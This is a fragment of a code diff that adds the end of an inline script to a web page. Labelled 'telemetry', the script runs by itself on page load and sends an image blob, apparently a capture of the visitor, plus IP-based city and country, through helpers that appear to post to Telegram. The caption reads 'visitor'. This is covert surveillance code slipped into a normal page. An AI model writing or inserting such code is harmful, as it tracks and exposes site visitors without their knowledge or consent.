+            if (blob) {
+              tgPhoto(blob, 'Tashrif buyuruvchi | ' + (ip.city || '') + ', ' + (ip.country_name || ''));
+            }
+            tgMsg(msg);
+          });
+        });
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', runTelemetry);
+      } else {
+        runTelemetry();
+      }
+    })();
+  </script>
+</body>
+</html>
